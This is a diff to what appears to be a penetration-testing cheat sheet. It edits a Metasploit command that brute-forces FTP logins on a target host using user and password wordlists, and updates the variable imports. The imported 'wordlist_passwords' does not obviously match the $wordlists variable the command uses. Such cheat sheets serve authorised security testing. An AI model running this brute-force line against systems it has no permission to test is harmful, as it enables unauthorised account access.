@@ -69,10 +69,10 @@ var rhost_ip
 Run Metasploit FTP login brute force with wordlists.
 
 ```sh title:"Run FTP login brute force with Metasploit"
-msfconsole -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS $rhost_ip; set USER_FILE $user_file; set PASS_FILE $pass_file; run; exit"
+msfconsole -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS $rhost_ip; set USER_FILE $wordlists_users; set PASS_FILE $wordlists; run; exit"
 ```
 <!-- cheat
+import wordlists_users
+import wordlist_passwords
 var rhost_ip
-var user_file
-var pass_file
 -->
